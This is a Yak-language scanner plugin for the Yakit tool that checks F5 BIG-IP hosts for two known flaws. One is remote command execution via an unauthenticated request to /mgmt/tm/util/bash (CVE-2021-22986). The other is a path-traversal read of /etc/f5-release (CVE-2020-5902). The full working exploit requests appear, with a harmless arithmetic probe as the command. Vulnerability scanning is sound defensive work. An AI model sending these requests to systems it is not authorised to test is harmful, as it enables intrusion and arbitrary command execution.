yakit.AutoInitYakit()

// 准备发送的报文模版

PacketPoc1 = `POST /mgmt/tm/util/bash HTTP/1.1
Host: {{params(target)}}
Authorization: Basic YWRtaW46
Accept: */*
Accept-Encoding: gzip
Content-Length: 192
Content-Type: application/json
X-F5-Auth-Token: 
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

{{params(payload)}}`

PacketPoc2 = `POST /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp HTTP/1.1
Host: {{params(target)}}
Accept: */*
Accept-Encoding: gzip
Content-Length: 192
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

{{params(payload)}}`

//漏洞检测规则函数
rules = []
addRule = func(packet, payload, check, riskType, riskTypeVerbose, severity, reference) {
    rules = append(
        rules, 
        {"packet": packet, "payload": payload, "check": check, "type": riskType, "typeVerbose": riskTypeVerbose, "severity": severity, "reference": reference}, 
    )
}

//填充对应的漏洞检测规则
addRule(
    PacketPoc1, 
    `{"command":"run","utilCmdArgs":"-c ''expr 1950 + 8912''"}`, 
    func(rsp, header, body) {
        if rsp.StatusCode == 200 && str.MatchAllOfSubString(body, `10862`) {
            return true
        }

        return false
    }, 
    "RCE", 
    "f5-cve-2021-22986", 
    "high", 
    "https://support.f5.com/csp/article/K03009991", 
)

addRule(
    PacketPoc2, 
    `fileName=%2Fetc%2Ff5-release`, 
    func(rsp, header, body) {
        if rsp.StatusCode == 200 && str.MatchAllOfSubString(body, `BIG-IP release`) {
            return true
        }

        return false
    }, 
    "RCE", 
    "cve-2020-5902", 
    "high", 
    "https://support.f5.com/csp/article/K52145254", 
)

//漏洞检测handle
handleRule = func(swg, isTls, addr, rule) {
    swg.Add()
    go func {
        defer swg.Done()


        defer func {         recover() }


        resp, req, err = poc.HTTP(
            rule["packet"], 
            poc.https(isTls), 
            poc.params({"target": addr, "payload": rule.payload}), 
            poc.redirectTimes(0), 
        )
        if err != nil {
            yakit.Error("poc.HTTP error: %v", err)
            return
        }

        header, body = poc.Split(resp)
        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
        url = urlIns.String()
        if rule.check(rspIns, header, body) {
            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
            risk.NewRisk(
                url, 
                risk.severity(rule.severity), 
                risk.title(sprintf("FOUND %v", rule.typeVerbose)), 
                risk.titleVerbose(sprintf("reference %v", rule.reference)), 
                risk.type(rule.type), 
                risk.typeVerbose(rule.typeVerbose), 
                risk.payload(rule.payload), 
                risk.details({"request": req, "response": resp, "url": url}), 
            )
            return
        }

        return
    }
}

handle = func(result) {
    if !result.IsOpen() {
        return
    }


    if len(result.Fingerprint.HttpFlows) <= 0 {
        return
    }

    addr = str.HostPort(result.Target, result.Port)
    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))

    // 漏洞检测
    swg = sync.NewSizedWaitGroup(10)
    for _, rule = range rules {
        handleRule(swg, isTls, addr, rule)
    }

    swg.Wait()
}
